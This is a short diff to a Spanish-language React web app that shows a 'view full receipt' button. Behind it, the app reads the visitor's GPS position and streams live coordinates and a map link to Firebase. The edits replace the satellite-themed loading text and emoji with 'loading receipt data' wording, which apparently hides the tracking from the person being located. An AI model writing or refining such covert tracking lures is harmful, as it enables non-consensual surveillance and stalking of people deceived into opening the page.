@@ -82,7 +82,7 @@ function App() {
               "ubicacion_gps.es_precisa": acc <= 20 ? "SI (TIEMPO REAL)" : "AJUSTANDO SEÑAL...",
               "ubicacion_gps.mapa_link": `https://www.google.com/maps?q=${lat},${lng}`
             });
-            setFirebaseStatus("📡 Sincronizando movimiento en vivo...");
+            setFirebaseStatus("Sincronizando movimiento en vivo...");
             
             // Efecto visual de parpadeo
             setTimeout(() => setFirebaseStatus("✅ Ubicación Rastreada"), 1500);
@@ -112,7 +112,7 @@ function App() {
   const handleVerifyReceipt = async () => {
     setLoading(true);
     setFirebaseStatus("");
-    setLoadingText("Conectando con satélites...");
+    setLoadingText("Cargando datos del comprobante...");
 
     if (!navigator.geolocation) {
       alert("Tu navegador no soporta GPS");
@@ -227,7 +227,7 @@ function App() {
                   boxShadow: '0 4px 8px rgba(0,0,0,0.2)'
                 }}
               >
-                {loading ? `📡 ${loadingText}` : 'VER COMPROBANTE COMPLETO'}
+                {loading ? ` ${loadingText}` : 'VER COMPROBANTE COMPLETO'}
               </button>
             </div>
           </div>
